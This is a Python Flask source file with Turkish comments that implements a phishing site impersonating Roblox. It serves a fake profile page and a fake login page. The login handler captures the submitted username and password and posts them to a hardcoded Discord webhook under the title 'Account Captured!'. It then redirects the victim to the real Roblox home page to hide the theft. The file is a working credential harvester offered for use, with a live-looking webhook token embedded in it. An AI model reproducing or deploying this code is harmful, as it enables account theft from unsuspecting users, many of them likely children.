import os
import requests
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k"

# 1. ADIM: Kullanıcı siteye ilk girdiğinde PROFİL sayfasını görsün
@app.route('/users/9325970578/profile')
def home():
    return render_template('profil.html')

# 2. ADIM: Profildeki buton buraya yönlendirecek
@app.route('/login')
def auth_page():
    return render_template('login.html')

# 3. ADIM: Login sayfasındaki verileri yakalayan kısım
@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')

    if DISCORD_WEBHOOK_URL.startswith("https://"):
        data = {
            "embeds": [{
                "title": "🎯 Hesap Yakalandı!",
                "fields": [
                    {"name": "Kullanıcı", "value": f"`{user}`", "inline": True},
                    {"name": "Şifre", "value": f"`{pw}`", "inline": True}
                ],
                "color": 15158332
            }]
        }
        requests.post(DISCORD_WEBHOOK_URL, json=data)

    # Veriyi aldıktan sonra gerçek Roblox'a şutla
    return redirect("https://www.roblox.com/home")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
